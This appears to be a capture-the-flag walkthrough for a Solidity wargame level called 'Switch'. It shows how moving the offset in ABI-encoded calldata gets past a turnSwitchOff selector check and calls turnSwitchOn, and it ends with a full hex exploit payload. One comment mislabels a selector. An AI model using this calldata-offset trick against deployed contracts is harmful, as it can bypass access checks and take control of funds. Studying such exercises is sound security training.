# Switch

- Bug class: `ABI encoding`

## Step I: Inspect the contract code

Let's get all the function selectors of the Switch contract
```bash
forge inspect instances/Ilevel29.sol:Switch methodIdentifiers
{
    "flipSwitch(bytes)": "30c13ade",
    "offSelector()": "5a2cfa66",
    "switchOn()": "f9f8f895",
    "turnSwitchOff()": "20606e15",
    "turnSwitchOn()": "76227e12"
}
```

## Step II: Inspect the legitimate payload
```js
console.logBytes(
    abi.encodeWithSignature(
        "flipSwitch(bytes)",
        abi.encodeWithSignature("turnSwitchOff()")
    )
);
```
*Please check [Solidity ABI Encoding Specs](https://docs.soliditylang.org/en/latest/abi-spec.html) for more details.*
```bash
(1) 0x30c13ade // 4 bytes function selector for flipSwitch(bytes)
(2) 0000000000000000000000000000000000000000000000000000000000000020 // 32 bytes offset to the first argument (bytes _data) of flipSwitch(bytes)
(3) 0000000000000000000000000000000000000000000000000000000000000004 // length of the first argument (bytes _data) of flipSwitch(bytes)
(4) 20606e1500000000000000000000000000000000000000000000000000000000 // data of the first argument (bytes _data) of flipSwitch(bytes) which is the function selector for turnSwitchOn()
```
We must keep the block (4) to pass the check `turnSwitchOff` signature check, but we will change the block (2) to point to our malicious payload.

## Step III: Craft the malicious payload
```
(1) 0x30c13ade // 4 bytes function selector for flipSwitch(bytes)
(2) 0000000000000000000000000000000000000000000000000000000000000060 // 32 bytes offset to the first argument (bytes _data) of flipSwitch(bytes)
(3) 0000000000000000000000000000000000000000000000000000000000000004 // do not load, could be anything
(4) 20606e1500000000000000000000000000000000000000000000000000000000 // keep this to pass the check
(5) 0000000000000000000000000000000000000000000000000000000000000004 // length of the first argument (bytes _data) of flipSwitch(bytes)
(6) 76227e1200000000000000000000000000000000000000000000000000000000 // payload: flipSwitchOn function selector
```
---
Final payload:
```
0x30c13ade0000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000000420606e1500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000476227e1200000000000000000000000000000000000000000000000000000000
```